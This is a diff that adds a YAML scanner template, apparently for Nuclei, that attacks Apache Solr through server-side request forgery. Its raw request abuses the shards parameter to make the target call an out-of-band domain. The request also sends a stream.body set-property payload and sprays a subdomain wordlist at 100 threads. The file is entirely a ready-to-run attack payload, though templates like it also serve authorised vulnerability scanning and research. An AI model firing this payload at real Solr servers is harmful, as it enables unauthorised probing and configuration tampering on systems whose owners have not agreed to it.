@@ -1,0 +1,26 @@
+id: ApacheSolr-SSRF-1
+info:
+  author: 0xAwali
+  description: Apache Solr SSRF Via Shards Parameter , Commonly Bound Ports 8983
+  name: Apache Solr SSRF
+  reference:
+  - https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#solr
+  - https://github.com/veracode-research/solr-injection
+  severity: critical
+requests:
+- attack: sniper
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /search?q=Apple&shards=http://{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
+    HTTP/1.1
+
+    Host: {{Subdomains}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/81.0.4044.138 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate'
+  threads: 100
